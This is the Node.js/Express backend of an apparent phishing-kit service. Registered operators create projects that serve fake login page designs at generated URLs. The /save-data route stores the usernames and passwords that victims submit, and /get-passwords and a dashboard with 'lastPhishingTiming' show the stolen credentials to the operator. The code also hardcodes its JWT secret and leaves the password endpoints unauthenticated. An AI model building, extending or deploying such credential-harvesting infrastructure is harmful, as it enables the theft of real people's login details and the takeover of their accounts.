let express = require("express")
let app = express();
let bodyParser = require("body-parser")
let cors = require("cors")
let mongo = require("./db");
let bcrypt = require("bcrypt")
let auth_apis = require("./apis/auth_apis")
let apis = require("./apis/other_apis")
let jwt = require("jsonwebtoken")
let cookieParser = require("cookie-parser")
let idGenerator = require("./idGenerator");
const db = require("./db");
let path = require("path")


mongo.connectToServer(function (err, client) {
    if (err) console.log(err);
    app.locals.db = mongo.getDb();
    console.log("DB connected")
});

app.use(express.static(path.join(__dirname, "build")))

app.use(cookieParser());
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static(path.join(__dirname, 'public')));


function isUserAuthentic(req, res, next) {
    let token = req.cookies['token'];
    if (token) {
        let isVerified = jwt.verify(token, "This is a secret");
        if (isVerified) {
            next();
        } else {
            res.send("User Not Authenticated");
        }
    } else {
        res.send("User Not Authenticated");
    }
}

// This code only allows the resourse sharing from http://localhost:8080/
app.use(cors())




app.post("/login", async (req, res) => {
    let enteredData = req.body;
    let db = app.locals.db;

    let is_mail_exists = await auth_apis.check_if_mail_exist(enteredData.mail);
    if (!is_mail_exists) {
        res.send({
            isSuccess: false,
            message: "Wronng E-mail or password entered"
        })
    } else {
        let userData = await auth_apis.get_user_data(enteredData.mail);

        if (bcrypt.compareSync(enteredData.password, userData.password)) {
            delete userData.password;
            let token = jwt.sign(userData, "This is a secret");
            res.cookie("token", token);
            res.send({
                isSuccess: true,
            })
        } else {
            res.send({
                isSuccess: false,
                message: "Wronng E-mail or password entered"
            })
        }

    }

})



app.post("/signup", async (req, res) => {
    let db = app.locals.db;
    let data = req.body;
    data.password = bcrypt.hashSync(data.password, 10);

    let username = auth_apis.create_userName(data.mail)
    let is_mail_exists = await auth_apis.check_if_mail_exist(data.mail);
    let is_phone_exits = await auth_apis.check_if_phone_exist(data.phone);
    if (is_phone_exits) {
        res.send("Phone Number already registered")
        return;
    }

    if (is_mail_exists) {
        res.send("Mail already registered")
        return;
    }

    data.username = username;


    db.collection("users").insertOne({ ...data }).then((result) => {
        res.send({
            isSuccess: true,
        })
    }).catch((err) => {
        res.send(err)
    })

})



app.post("/verify-token", (req, res) => {
    let token = req.body.token;
    try {
        var result = jwt.verify(token, "This is a secret");
        res.send(true)
    } catch (err) {
        res.send(false);
    }
})


app.post("/createProject", isUserAuthentic, async (req, res) => {
    let token = req.cookies['token'];
    let tokenData = jwt.decode(token);
    let projectId = idGenerator(12);
    let db = app.locals.db;
    let url = "http://localhost:8080/xxx/" + "?projectId=" + projectId;
    let remainingEntries = 10;
    let entries = [];
    let dataToStore = {
        userId: tokenData._id,
        ...req.body,
        projectId,
        url,
        remainingEntries,
        entries
    }
    db.collection("projects").insertOne({ ...dataToStore }).then((result) => {
        res.send({
            success: true,
            url: url,
            projectId
        });
        return
    }).catch((err) => {
        res.send({
            success: false
        });
    })
})

app.get("/xxx", async (req, res) => {
    let db = app.locals.db;
    let projectId = req.query.projectId;
    let designName = await apis.getDesignName(projectId);
    designName = designName['selectedItem'];

    res.sendFile(path.join(__dirname, "public", "views", designName + ".html"))
})



app.get("/get-user-projects", isUserAuthentic, (req, res) => {
    let token = req.cookies['token'];
    let tokenData = jwt.decode(token);
    let userId = tokenData._id;
    let db = app.locals.db;

    db.collection("projects").find({ userId }).toArray().then((result) => {
        res.send({
            isSuccess: true,
            projects: result
        })
    }).catch((err) => {
        res.send({
            isSuccess: false,
            message: err,
        });
    })
})


app.post("/save-data", async (req, res) => {
    let projectId = req.query.projectId
    let selectedItem = req.query.selectedItem
    let userName = req.body.userName
    let password = req.body.password
    let timing = Date.now();
    let remainingEntries = await apis.getRemainingEntries(projectId)
    let db = app.locals.db;
    let token = req.cookies['token']
    let userId = jwt.decode(token)["_id"]



    let dataToInsert = { userName, password, timing, projectId, selectedItem, userId }
    if (remainingEntries == 0) {
        res.send({ isSuccess: false })
    } else {
        await db.collection("entries").insert({ ...dataToInsert })
        await apis.decrementRemainingEntriesByOne(projectId)
    }

    res.send({
        isSuccess: true
    })
})


app.get("/get-a-project-details", isUserAuthentic, async (req, res) => {
    let db = app.locals.db;
    let projectId = req.query.projectId;
    try {

        let projectDetails = await db.collection("projects").findOne({ projectId: parseInt(projectId) })
        let entries = await db.collection("entries").find({ projectId: projectId }).toArray()

        console.log(entries)
        let dataToSend = { ...projectDetails, entries }
        res.send({
            isSuccess: true,
            data: dataToSend
        })

    } catch (err) {
        console.log(err)
        res.send({
            isSuccess: false,
            message: err
        })
    }


})



app.get("/get-passwords", (req, res) => {
    let db = app.locals.db;
    let token = req.cookies['token']
    let userId = jwt.decode(token)["_id"]
    let limit = req.query.limit
    let selectedItem = req.query.selectedItem
    let sortBy = req.query.sortBy;

    let dbQuery = { userId }
    let sortQuery = null

    if (selectedItem) {
        dbQuery = { userId, selectedItem }
    }

    if (sortBy == "timing") {
        sortQuery = { timing: 1 }
    } else {
        if (sortBy == "alphabet") {
            sortQuery = { userName: 1 }
        }
    }

    db.collection("entries").find(dbQuery, {
        "projection": {
            _id: 0,
            userName: 1,
            password: 1,
            selectedItem: 1,
            timing: 1
        }
    }).limit(parseInt(limit)).sort(sortQuery).toArray().then((result) => {
        res.send({
            isSuccess: true,
            data: result
        })
    }).catch((err) => {
        res.send({
            isSuccess: false,
            message: err
        })
    })
})



app.get("/dashboard-data", isUserAuthentic, async (req, res) => {
    let token = req.cookies["token"]
    let tokenData = jwt.decode(token)
    let userId = tokenData._id
    let totalProjects = await apis.getTotalProjects(userId);
    let totalActiveProjects = 0;
    let totalExpiredProject = 0;
    let totalWebsites = new Set();


    for (item of totalProjects) {
        if (item.remainingEntries > 0) {
            totalActiveProjects++;
        } else {
            totalExpiredProject++;
        }
        totalWebsites.add(item.selectedItem);
    }
    totalProjects = totalProjects.length;
    totalWebsites = totalWebsites.size;


    let totalPasswords = await apis.getTotalPasswords(userId);
    let lastPhishingTiming = "No Data";
    let last_5_passowrds = [];

    if (totalPasswords.length) {
        lastPhishingTiming = new Date(totalPasswords[totalPasswords.length - 1].timing).toLocaleString();
        totalPasswords.reverse();
        for (let i = 0; i < totalPasswords.length; i++) {
            if(i == 5){
                break;
            }
            last_5_passowrds.push(totalPasswords[i]);
        }
    }
 
    totalPasswords = totalPasswords.length;

    let dataToSend = {
        totalProjects,
        totalActiveProjects,
        totalExpiredProject,
        totalWebsites,
        totalPasswords,
        lastPhishingTiming,
        last_5_passowrds
    }

    res.send(dataToSend);
})


app.get("/my-profile", isUserAuthentic, async (req, res) => {
    let token = req.cookies["token"]
    let tokenData = jwt.decode(token)
    let mail = tokenData.mail

    let userData = await auth_apis.get_user_data(mail)
    delete userData.password
    res.send(userData)
})


app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "build", "index.html"))
})


app.listen("8080", () => {
    console.log("Backend is running smoothly")
})